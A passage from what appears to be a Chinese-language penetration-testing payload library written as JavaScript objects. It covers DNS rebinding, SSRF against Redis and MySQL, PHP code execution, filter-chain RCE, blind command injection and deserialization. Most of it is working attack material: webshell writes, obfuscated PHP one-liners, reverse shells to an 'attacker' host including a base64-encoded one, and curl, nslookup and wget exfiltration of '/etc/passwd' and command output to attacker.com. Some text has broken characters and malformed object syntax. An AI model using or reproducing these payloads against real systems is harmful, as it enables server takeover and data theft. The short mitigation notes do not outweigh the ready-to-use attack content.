        command: '第一次DNS查询：返回外网IP（通过验证）\n第二次DNS查询：返回内网IP（实际访问）\n利用TTL=0或短TTL', 
        description: 'DNS重绑定原理', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'TTL=0', explanation: 'DNS记录立即过期' },
          { part: '第一次查询', explanation: '返回允许的IP' },
          { part: '第二次查询', explanation: '返回内网IP' }
        ]
      },
      { 
        title: '2. 使用公开服务', 
        command: 'http://7f000001.cip.cc (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\nhttp://127.0.0.1.xip.io\nhttp://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network',
            syntaxBreakdown: [
              { part: 'http://7f000001.cip.cc', explanation: '命令/载荷起始', type: 'command' },
              { part: ' (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\nhttp://127.0.0.1.xip.io\nhttp://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用DNS重绑定服务', 
        platform: 'all'
      },
      { 
        title: '3. 自建DNS服务器', 
        command: '# 使用dnspython搭建\nfrom dnslib import *\nclass RebindResolver:\n    def __init__(self):\n        self.count = 0\n    def resolve(self, request):\n        self.count += 1\n        if self.count % 2 == 1:\n            return "1.2.3.4"  # 外网IP\n        else:\n            return "127.0.0.1"  # 内网IP',
            syntaxBreakdown: [
              { part: '# 使用dnspython搭建\nfrom dnslib import *\nclass RebindResolver:\n    def __init__(s', explanation: '攻击载荷', type: 'value' }
            ],
        description: '自建DNS重绑定服务器', 
        platform: 'all'
      },
      { 
        title: '4. 攻击流程', 
        command: '1. 注册域名指向自建DNS服务器\n2. 配置DNS服务器返回两个IP\n3. 使用该域名发起SSRF请求\n4. 第一次验证通过，第二次访问内网',
            syntaxBreakdown: [
              { part: '1.', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 注册域名指向自建DNS服务器\n2. 配置DNS服务器返回两个IP\n3. 使用该域名发起SSRF请求\n4. 第一次验证通过，第二次访问内网', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '完�攻击流程', 
        },
      ],
    wafBypass: [
      { 
        title: '多IP响应', 
        command: 'DNS响应包含多个A记录\n服务器可能选择不同的IP',
            syntaxBreakdown: [
              { part: 'DNS响应包含多个A记录\n服务器可能选择不同的IP', explanation: '攻击载荷', type: 'value' }
            ],
        description: '利用多IP响应', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'DNS重绑定攻击通过在两次DNS查询间改变域名解析结果(先解析为合法IP通过验证，再解析为内网IP发起请求)来绕过SSRF的域名/IP校验，是最隐蔽的SSRF绕过方式之一。',
      vulnerability: 'DNS重绑定利用DNS TTL极低(0-1秒)的域名：第一次解析返回公网IP通过服务端URL验证，第二次解析(实际请求时)返回127.0.0.1或内网IP。可利用在线DNS重绑定服务(如rbndr.us/lock.cmpxchg8b.com)或自建DNS服务器。',
      exploitation: '完�利用流程：\n1. 搭建或使用DNS重绑定服务\n2. 配置域名解析策略\n3. 使用该域名发起请求\n4. 绕过验证访问内网',
      mitigation: '防御措施：\n1. 缓存DNS解析结果\n2. 使用IP地址而非域名验证\n3. 禁用DNS解析\n4. 网络层隔离',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssrf-redis',
    name: 'SSRF攻击Redis',
    description: '利用SSRF攻击内网Redis服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'Redis攻击',
    tags: ['ssrf', 'redis', 'rce', 'webshell'],
    prerequisites: ['存在SSRF漏�', '内网存在未授权Redis'],
    execution: [
      { 
        title: '1. 探测Redis', 
        command: 'dict://127.0.0.1:6379/info\n或使用Gopher:\ngopher://127.0.0.1:6379/_INFO',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/info\n或使用Gopher:\ngopher://127.0.0.1:6379/_INFO', explanation: '攻击载荷', type: 'value' }
            ],
        description: '探测Redis服务', 
        platform: 'all'
      },
      { 
        title: '2. 写入WebShell', 
        command: '# 使用Dict协议\ndict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save', 
        description: '写入WebShell到Web目录', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'set shell', explanation: '设置键值' },
          { part: 'config set dir', explanation: '设置保存目录' },
          { part: 'config set dbfilename', explanation: '设置保存文件名' },
          { part: 'save', explanation: '保存数据库到文件' }
        ]
      },
      { 
        title: '3. 写入SSH公钥', 
        command: 'dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."\ndict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh\ndict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys\ndict://127.0.0.1:6379/save',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa', explanation: '命令/载荷起始', type: 'command' },
              { part: ' AAAA..."\ndict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh\ndict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys\ndict://127.0.0.1:6379/save', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '写入SSH公钥', 
        platform: 'all'
      },
      { 
        title: '4. 写入Cron任务', 
        command: 'dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron\ndict://127.0.0.1:6379/config%20set%20dbfilename%20root\ndict://127.0.0.1:6379/save',
            syntaxBreakdown: [
              { part: 'dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/444', explanation: '攻击载荷', type: 'value' }
            ],
        description: '写入Cron反弹Shell', 
        platform: 'linux'
      },
      { 
        title: '5. 主从复制RCE', 
        command: '# 使用redis-rogue-server\npython redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com\n利用Redis主从复制加载恶意模块',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 使用redis-rogue-server\npython redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com\n利用Redis主从复制加载恶意模块', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '主从复制RCE', 
        },
      ],
    wafBypass: [
      { 
        title: 'Gopher协议构造', 
        command: '使用Gopher协议构造完�的Redis命令序列\n可以绕过Dict协议限制',
            syntaxBreakdown: [
              { part: '使用Gopher协议构造完�的Redis命令序列\n可以绕过Dict协议限制', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用Gopher协议', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SSRF攻击Redis是最经典的内网服务利用场景，通过gopher://协议向Redis发送命令，可写入WebShell、SSH公钥、Crontab定时任务等，从SSRF直接升级为服务器RCE。',
      vulnerability: 'Redis默认无认证且监听0.0.0.0:6379。SSRF通过gopher://发送Redis命令：1)SET/CONFIG SET dir+dbfilename写WebShell到Web目录 2)写SSH公钥到/root/.ssh/authorized_keys 3)写Crontab反弹Shell 4)主从复制加载恶意模块(RCE)。',
      exploitation: '完�利用流程：\n1. 通过SSRF探测Redis\n2. 写入WebShell\n3. 或写入SSH公钥\n4. 或写入Cron任务\n5. 获取服务器权限',
      mitigation: '防御措施：\n1. Redis设置密码认证\n2. 绑定内网IP\n3. 禁用危险命令\n4. 网络隔离',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-mysql',
    name: 'SSRF攻击MySQL',
    description: '利用SSRF攻击内网MySQL服务',
    category: 'SSRF服务端请求伪造',
    subCategory: 'MySQL攻击',
    tags: ['ssrf', 'mysql', 'gopher', 'database'],
    prerequisites: ['存在SSRF漏�', '内网存在MySQL服务', '知道MySQL用户名'],
    execution: [
      { 
        title: '1. MySQL协议基础', 
        command: 'MySQL通信协议:\n- 握手包\n- 认证包\n- 命令包\n需要构造符合协议的数据',
        syntaxBreakdown: [
          { part: 'MySQL通信协议', explanation: 'MySQL使用自定义二进制协议通信，基于TCP', type: 'command' },
          { part: '握手包', explanation: '服务端发送的初始包，包含协议版本、服务器版本、随机挑战数', type: 'parameter' },
          { part: '认证包', explanation: '客户端发送的认证信息，包含用户名和加密密码', type: 'parameter' },
          { part: '命令包', explanation: '认证后发送的SQL命令包，类型为COM_QUERY(0x03)', type: 'value' }
        ], 
        description: 'MySQL协议基础', 
        platform: 'all'
      },
      { 
        title: '2. 使用Gopher攻击MySQL', 
        command: '# 构造MySQL协议数据包\n# 需要使用工具生成\ngopher://127.0.0.1:3306/_[MySQL Protocol Data]\n\n# 使用sqlmap\ngopher://127.0.0.1:3306/_[sqlmap生成的payload]',
        syntaxBreakdown: [
          { part: 'gopher://', explanation: 'Gopher协议前缀，允许发送原始TCP数据', type: 'command' },
          { part: '127.0.0.1:3306', explanation: '目标MySQL服务地址和端口（默认3306）', type: 'value' },
          { part: '/_', explanation: 'Gopher数据分隔符，_后为实际发送的数据', type: 'operator' },
          { part: '[MySQL Protocol Data]', explanation: 'URL编码的MySQL协议二进制数据包', type: 'variable' }
        ], 
        description: 'Gopher协议攻击MySQL', 
        platform: 'all'
      },
      { 
        title: '3. 使用工具生成Payload', 
        command: '# 使用Gopherus工具\npython gopherus.py --exploit mysql\n输入用户名和SQL命令\n生成Gopher URL\n\n# 或使用mysql_gopher_attack工具',
        syntaxBreakdown: [
          { part: 'python gopherus.py', explanation: '运行Gopherus自动化Gopher payload生成工具', type: 'command' },
          { part: '--exploit mysql', explanation: '指定攻击目标为MySQL服务', type: 'parameter' },
          { part: '输入用户名和SQL命令', explanation: '交互式输入MySQL用户名（常为root）和要执行的SQL', type: 'value' }
        ], 
        description: '使用工具生成Payload', 
        platform: 'all'
      },
      { 
        title: '4. 执行SQL命令', 
        command: 'SELECT * FROM users;\nSELECT user(), version();\n写入WebShell:\nSELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";',
        syntaxBreakdown: [
          { part: 'SELECT user(), version()', explanation: '查询当前数据库用户和MySQL版本信息', type: 'command' },
          { part: 'INTO OUTFILE', explanation: 'MySQL写文件语句，需要FILE权限和secure_file_priv允许', type: 'parameter' },
          { part: '/var/www/html/shell.php', explanation: 'WebShell写入路径，需在Web可访问目录下', type: 'value' }
        ], 
        description: '执行SQL命令', 
        },
      ],
    wafBypass: [
      { 
        title: '无密码MySQL', 
        command: '如果MySQL允许空密码连接\n可以�容易构造攻击载荷',
        syntaxBreakdown: [
          { part: '空密码连接', explanation: 'MySQL允许空密码时，认证包中密码字段为空', type: 'command' },
          { part: '简化协议构造', explanation: '无需计算密码哈希，攻击载荷更简单更可靠', type: 'parameter' }
        ], 
        description: '利用空密码配置', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SSRF攻击MySQL利用gopher://协议构造MySQL通信报文，在目标MySQL允许无密码本地连接时可执行任意SQL语句，读取敏感数据或通过INTO OUTFILE写入WebShell。',
      vulnerability: 'MySQL认证允许本地空密码连接时(常见于开发环境)，SSRF通过gopher://发送MySQL协议数据包：1)认证握手报文 2)查询报文(SELECT/INSERT/INTO OUTFILE)。利用工具如Gopherus可自动生成URL编码的MySQL协议payload。',
      exploitation: '完�利用流程：\n1. 确认MySQL服务\n2. 获取用户名\n3. 构造协议数据包\n4. 执行SQL命令\n5. 写入WebShell',
      mitigation: '防御措施：\n1. MySQL设置强密码\n2. 禁止空密码登录\n3. 限制网络访问\n4. 禁用文件写入功能',
      difficulty: 'advanced'
    }
  },
  {
    id: 'rce-php',
    name: 'PHP代码执行',
    description: 'PHP代码执行漏�利用技术',
    category: 'RCE远程代码执行',
    subCategory: 'PHP代码执行',
    tags: ['rce', 'php', 'code', 'execution'],
    prerequisites: ['存在PHP代码执行点', '用户输入可控制代码'],
    execution: [
      { 
        title: '1. 常见危险函数', 
        command: 'eval($_POST[cmd]);\nassert($_POST[cmd]);\npreg_replace(\'/a/e\',$_POST[cmd],\'a\');\ncreate_function(\'\',$_POST[cmd]);\narray_map($_POST[func],$_POST[arr]);\ncall_user_func($_POST[func],$_POST[arg]);', 
        description: 'PHP危险函数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'eval()', explanation: '执行字符串作为PHP代码' },
          { part: 'assert()', explanation: '断言函数，可执行代码' },
          { part: 'preg_replace /e', explanation: '正则替换执行模式' },
          { part: 'create_function()', explanation: '动态创建函数' }
        ]
      },
      { 
        title: '2. 命令执行', 
        command: 'system(\'whoami\');\nexec(\'whoami\');\nshell_exec(\'whoami\');\npassthru(\'whoami\');\npopen(\'whoami\',\'r\');\nproc_open(\'whoami\',$desc,$pipes);\n`whoami`;', 
        description: 'PHP命令执行函数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行命令并输出结果' },
          { part: 'exec()', explanation: '执行命令返回最后一行' },
          { part: 'shell_exec()', explanation: '执行命令返回全部输出' },
          { part: '``', explanation: '反引号执行命令' }
        ]
      },
      { 
        title: '3. 一句话木马', 
        command: '<?php @eval($_POST[cmd]);?>\n<?php @assert($_POST[cmd]);?>\n<?php @system($_GET[cmd]);?>\n<?php $a=create_function(\'\',$_POST[cmd]);$a();?>',
        description: '常见一句话木马', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'eval()', explanation: '执行PHP代码', type: 'function' }
        ]
      },
      { 
        title: '4. 免杀一句话', 
        command: '<?php $a=\'ev\'.$_POST[1];$a($_POST[cmd]);?>\n<?php $_=\'a\'.\'s\'.\'s\'.\'e\'.\'r\'.\'t\';$_($_POST[cmd]);?>\n<?php $a=base64_decode(\'YXNzZXJ0\');$a($_POST[cmd]);?>',
        description: '免杀一句话木马', 
        },
      ],
    wafBypass: [
      { 
        title: '回调函数绕过', 
        command: 'array_map(\'assert\',array($_POST[cmd]));\ncall_user_func(\'assert\',$_POST[cmd]);\n$a=\'assert\';$a($_POST[cmd]);',
        description: '使用回调函数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'array_map(\\'assert\\',array($_P', explanation: '绕过技术', type: 'technique' },
          { part: '\\'assert\\';$a($_POST[cmd]);', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '变量函数绕过', 
        command: '$func=$_GET[\'func\'];$cmd=$_GET[\'cmd\'];$func($cmd);',
        description: 'WAF绕过技术',
        platform: 'all',
        syntaxBreakdown: [
          { part: '$func=$_GET[\\'func\\'];$cmd=$_G', explanation: '绕过技术', type: 'technique' },
          { part: '$func', explanation: '关键参数', type: 'value' },
          { part: '$_GET[\\'func\\'];$cmd', explanation: '关键参数', type: 'value' },
          { part: '$_GET[\\'cmd\\'];$func($cmd);', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: 'PHP代码执行漏洞通过eval()/assert()/preg_replace(e修饰符)/array_map()等函数将用户输入作为PHP代码执行，可直接读取文件、操作数据库、执行系统命令等。',
      vulnerability: 'PHP危险函数包括：eval()/assert()直接执行代码字符串、preg_replace()的e修饰符(PHP<7)将替换结果作为代码执行、create_function()/call_user_func()动态函数调用、array_map()/usort()回调函数注入。',
      exploitation: '完�利用流程：\n1. 发现代码执行点\n2. 构造恶意代码\n3. 执行系统命令\n4. 写入WebShell\n5. 获取服务器权限',
      mitigation: '防御措施：\n1. 禁用危险函数\n2. 使用白名单验证输入\n3. 使用参数化调用\n4. 最小权限原则',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-php-filter',
    name: 'PHP Filter链RCE',
    description: '利用PHP Filter链构造RCE',
    category: 'RCE远程代码执行',
    subCategory: 'PHP Filter链',
    tags: ['rce', 'php', 'filter', 'chain'],
    prerequisites: ['存在文件包含漏�', 'PHP版本支持Filter链'],
    execution: [
      { 
        title: '1. Filter链原理', 
        command: '利用php://filter的convert.base64-decode等过滤器\n通过精心构造的输入，最终生成可执行代码',
            syntaxBreakdown: [
              { part: '利用php://filter的convert.base64-decode等过滤器\n通过精心构造的输入，最终生成可执行代码', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'Filter链原理', 
        platform: 'all'
      },
      { 
        title: '2. 构造Filter链', 
        command: 'php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==\n使用多个过滤器串联', 
        description: '构造Filter链', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://filter', explanation: 'PHP过滤器协议' },
          { part: 'convert.base64-decode', explanation: 'Base64解码过滤器' },
          { part: 'resource=', explanation: '指定资源' }
        ]
      },
      { 
        title: '3. 使用工具生成', 
        command: '# 使用php_filter_chain_generator\npython3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"\n\n# 输出可�接使用的Filter链',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 使用php_filter_chain_generator\npython3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"\n\n# 输出可�接使用的Filter链', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用工具生成Filter链', 
        platform: 'all'
      },
      { 
        title: '4. 完�利用示例', 
        command: '?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp',
            syntaxBreakdown: [
              { part: '?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.', explanation: '攻击载荷', type: 'value' }
            ],
        description: '完�Filter链示例', 
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '使用不同编码过滤器组合\n绕过关键字检测',
            syntaxBreakdown: [
              { part: '使用不同编码过滤器组合\n绕过关键字检测', explanation: '攻击载荷', type: 'value' }
            ],
        description: '编码组合绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'PHP Filter链RCE是2022年发现的新技术，通过精心组合多个php://filter过滤器(iconv字符集转换)，在不使用文件上传的情况下从无到有生成任意内容，配合include实现RCE。',
      vulnerability: 'PHP Filter链利用iconv字符集转换过滤器的组合效应：通过特定的字符集转换序列(如UTF-7→UTF-8)逐字节构造任意PHP代码。一个LFI漏洞(include($_GET[\"file\"]))配合Filter链即可直接RCE，无需文件上传或日志投毒。',
      exploitation: '完�利用流程：\n1. 发现文件包含漏�\n2. 使用工具生成Filter链\n3. 构造恶意请求\n4. 执行任意代码',
      mitigation: '防御措施：\n1. 禁用php://filter\n2. 白名单限制文件路径\n3. 禁用危险过滤器\n4. 升级PHP版本',
      difficulty: 'advanced'
    }
  },
  {
    id: 'rce-cmd-blind',
    name: '盲命令注入',
    description: '无回显的命令注入利用技术',
    category: 'RCE远程代码执行',
    subCategory: '盲命令注入',
    tags: ['rce', 'blind', 'command', 'injection'],
    prerequisites: ['存在命令注入点', '无�接回显'],
    execution: [
      { 
        title: '1. 时�盲注', 
        command: '; sleep 5\n| sleep 5\n`sleep 5`\n$(sleep 5)\n& timeout 5\n观察响应时�判断命令是否执行', 
        description: '使用延时判断', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sleep 5', explanation: 'Linux延时命令' },
          { part: 'timeout 5', explanation: 'Windows延时命令' }
        ]
      },
      { 
        title: '2. DNS外带', 
        command: '; nslookup $(whoami).attacker.com\n; ping -c 1 $(whoami).attacker.com\n; host $(id | base64).attacker.com\n& nslookup %USERNAME%.attacker.com', 
        description: 'DNS外带数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'nslookup', explanation: 'DNS查询工具' },
          { part: '$(whoami)', explanation: '命令替换获取用户名' },
          { part: '.attacker.com', explanation: '攻击者控制的域名' }
        ]
      },
      { 
        title: '3. HTTP外带', 
        command: '; curl http://attacker.com/?data=$(whoami)\n; wget http://attacker.com/?data=$(id)\n; curl -d @/etc/passwd http://attacker.com/\n& certutil -urlcache -f http://attacker.com/?data=%USERNAME%',
            syntaxBreakdown: [
              { part: '; curl http://attacker.com/?data=$(whoami)\n; wget http://attacker.com/?data=$(i', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'HTTP外带数据', 
        platform: 'all'
      },
      { 
        title: '4. ICMP外带', 
        command: '; ping -p $(echo "test" | xxd -p) attacker.com\n; tcpdump -i eth0 icmp\n在攻击者服务器监听ICMP包',
            syntaxBreakdown: [
              { part: '; ping -p $(echo "test" | xxd -p) attacker.com\n; tcpdump -i eth0 icmp\n在攻击者服务器监', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'ICMP外带数据', 
        platform: 'linux'
      },
      { 
        title: '5. 反弹Shell', 
        command: '; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"\n; nc -e /bin/bash attacker 4444\n; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"',
            syntaxBreakdown: [
              { part: '; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"\n; nc -e /bin/bash attacker 4', explanation: '攻击载荷', type: 'value' }
            ],
        description: '反弹Shell', 
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash\n使用Base64编码绕过',
            syntaxBreakdown: [
              { part: ';', explanation: '命令/载荷起始', type: 'command' },
              { part: ' echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash\n使用Base64编码绕过', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'Base64编码绕过', 
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: '盲命令注入是指命令执行成功但结果不回显在响应中的场景，需要通过DNS外带(nslookup)、HTTP外带(curl)、延时判断(sleep)或写文件等间接方式确认漏洞存在和提取数据。',
      vulnerability: '盲命令注入的确认和利用方式：1)时间延迟(;sleep 5)判断执行 2)DNS外带(;nslookup $(whoami).attacker.com)获取命令输出 3)HTTP外带(curl http://attacker.com/$(cat /etc/hostname)) 4)写入Web目录后HTTP访问获取结果。',
      exploitation: '完�利用流程：\n1. 确认命令注入存在（时�盲注）\n2. 使用外带通道获取数据\n3. 构造反弹Shell\n4. 获取服务器权限',
      mitigation: '防御措施：\n1. 避免使用系统命令\n2. 使用参数化API\n3. 输入白名单验证\n4. 禁用危险函数',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-deserialize',
    name: '反序列化漏�',
    description: '利用反序列化漏�实现RCE',
    category: 'RCE远程代码执行',
    subCategory: '反序列化',
    tags: ['rce', 'deserialize', 'java', 'php'],
    prerequisites: ['存在反序列化点', '存在可利用的Gadget链'],
    execution: [
      { 
        title: '1. Java反序列化', 
        command: '# 常见漏�组件\nApache Commons Collections\nSpring Framework\nFastjson\nJackson\nWebLogic\n\n# 使用ysoserial生成payload\njava -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"', 
        description: 'Java反序列化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ysoserial', explanation: 'Java反序列化利用工具' },
          { part: 'CommonsCollections1', explanation: '利用链名称' }
        ]
      },
      { 
        title: '2. PHP反序列化', 
        command: '<?php\nclass Exploit {\n    public $cmd = "system(\'whoami\');";\n    function __destruct() {\n        eval($this->cmd);\n    }\n}\necho serialize(new Exploit());\n?>\n生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system(\'whoami\');";}',
        description: 'PHP反序列化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'eval()', explanation: '执行PHP代码', type: 'function' }
        ]
      },
      { 
        title: '3. Python反序列化', 
        command: 'import pickle\nimport os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, (\'whoami\',))\npayload = pickle.dumps(Exploit())\n# 发送payload触发反序列化',
        description: 'Python pickle反序列化', 
        platform: 'all'
      },
      { 
        title: '4. .NET反序列化', 
        command: '# 使用ysoserial.net\nysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"\n\n# 常见格式\nBinaryFormatter\nJson.NET\nXMLSerializer',
            syntaxBreakdown: [
              { part: '# 使用ysoserial.net\nysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"', explanation: '攻击载荷', type: 'value' }
            ],
        description: '.NET反序列化', 
        platform: 'windows'
      }
    ],
    wafBypass: [
      { 
        title: '签名绕过', 
        command: '如果存在签名验证\n需要获取密钥重新签名',
            syntaxBreakdown: [
              { part: '如果存在签名验证\n需要获取密钥重新签名', explanation: '攻击载荷', type: 'value' }
            ],
        description: '绕过签名验证', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '反序列化漏洞是将不可信数据还原为对象时触发恶意操作，存在于Java/PHP/Python/.NET等多种语言中。攻击者构造特殊的序列化数据，在反序列化过程中自动调用危险方法实现RCE。',
      vulnerability: '反序列化攻击利用对象在还原时自动调用的魔术方法(如Java的readObject、PHP的__wakeup/__destruct)。通过POP(Property Oriented Programming)链将多个类的方法调用串联，最终触发命令执行。',
      exploitation: '完�利用流程：\n1. 识别反序列化点\n2. 分析可用的Gadget链\n3. 生成恶意序列化数据\n4. 发送触发RCE',
      mitigation: '防御措施：\n1. 避免反序列化不可信数据\n2. 使用白名单类限制\n3. 禁用危险Gadget\n4. 使用安全的序列化格式',
      difficulty: 'advanced'
    }
  },
  {
    id: 'rce-deserialize-php',
    name: 'PHP反序列化',
    description: 'PHP反序列化漏�利用技术',
    category: 'RCE远程代码执行',
    subCategory: 'PHP反序列化',
    tags: ['rce', 'php', 'deserialize', 'unserialize'],
    prerequisites: ['存在unserialize调用', '存在可利用的类'],
    execution: [
      { 
        title: '1. 魔术方法', 
        command: '__construct() - 对象创建时调用\n__destruct() - 对象销毁时调用\n__wakeup() - 反序列化时调用\n__toString() - 对象转字符串时调用\n__call() - 调用不存在方法时触发',
        syntaxBreakdown: [
          { part: '__destruct()', explanation: '对象销毁时自动调用，常作为POP链的入口点', type: 'command' },
          { part: '__wakeup()', explanation: '反序列化时自动调用，可被CVE-2016-7124绕过', type: 'command' },
          { part: '__toString()', explanation: '对象转字符串时触发，如echo/print/字符串拼接', type: 'command' },
          { part: '__call()', explanation: '调用不存在方法时触发，可用于动态方法跳转', type: 'command' }
        ], 
        description: 'PHP魔术方法', 
        platform: 'all'
      },
      { 
        title: '2. 构造POP链', 
        command: '<?php\nclass Chain {\n    public $obj;\n    function __destruct() {\n        $this->obj->action();\n    }\n}\nclass Action {\n    public $cmd;\n    function action() {\n        system($this->cmd);\n    }\n}\n$payload = new Chain();\n$payload->obj = new Action();\n$payload->obj->cmd = "whoami";\necho serialize($payload);\n?>',
        syntaxBreakdown: [
          { part: 'class Chain', explanation: '入口类，__destruct触发时调用obj的action方法', type: 'command' },
          { part: '$this->obj->action()', explanation: '链式调用，通过对象属性跳转到目标类方法', type: 'operator' },
          { part: 'system($this->cmd)', explanation: '最终执行系统命令的sink点', type: 'value' },
          { part: 'serialize($payload)', explanation: '将构造好的对象链序列化为字符串payload', type: 'command' }
        ], 
        description: '构造POP链', 
        platform: 'all'
      },
      { 
        title: '3. Phar反序列化', 
        command: '# 生成Phar文件\n<?php\nclass Exploit {}\n$phar = new Phar(\'exploit.phar\');\n$phar->startBuffering();\n$phar->addFromString(\'test.txt\', \'test\');\n$phar->setStub(\'<?php __HALT_COMPILER(); ?>\');\n$o = new Exploit();\n$phar->setMetadata($o);\n$phar->stopBuffering();\n?>\n\n# 触发反序列化\nphar://exploit.phar/test.txt',
        syntaxBreakdown: [
          { part: 'new Phar()', explanation: '创建Phar归档文件对象', type: 'command' },
          { part: 'setStub()', explanation: '设置Phar文件头标识，__HALT_COMPILER()为必需结束符', type: 'parameter' },
          { part: 'setMetadata($o)', explanation: '设置元数据为恶意对象，读取Phar时自动反序列化', type: 'value' },
          { part: 'phar://exploit.phar', explanation: 'phar://流包装器触发元数据反序列化', type: 'command' }
        ], 
        description: 'Phar反序列化', 
        platform: 'all'
      },
      { 
        title: '4. Session反序列化', 
        command: '# 利用Session处理器差异\n# php_serialize vs php_binary\n构造恶意Session数据触发反序列化',
        syntaxBreakdown: [
          { part: 'php_serialize', explanation: 'Session序列化处理器，使用标准serialize格式', type: 'parameter' },
          { part: 'php_binary', explanation: '另一种Session处理器，使用二进制格式', type: 'parameter' },
          { part: '处理器差异', explanation: '不同处理器的分隔符不同导致注入恶意序列化数据', type: 'value' }
        ], 
        description: 'Session反序列化', 
        },
      ],
    wafBypass: [
      { 
        title: '属性修饰符绕过', 
        command: '使用public/private/protected属性\n注意序列化格式差异:\npublic: s:3:"cmd"\nprivate: s:8:"\\0Class\\0cmd"\nprotected: s:7:"\\0*\\0cmd"',
        syntaxBreakdown: [
          { part: 'public: s:3:"cmd"', explanation: '公有属性直接序列化属性名', type: 'value' },
          { part: 'private: s:8:"\0Class\0cmd"', explanation: '私有属性前后加\0和类名，长度包含null字节', type: 'value' },
          { part: 'protected: s:7:"\0*\0cmd"', explanation: '受保护属性前后加\0和*号', type: 'value' }
        ], 
        description: '属性修饰符处理', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'PHP反序列化利用unserialize()函数处理用户可控数据时触发魔术方法(__destruct/__wakeup/__toString等)，通过POP链调用system()/exec()等危险函数实现RCE。',
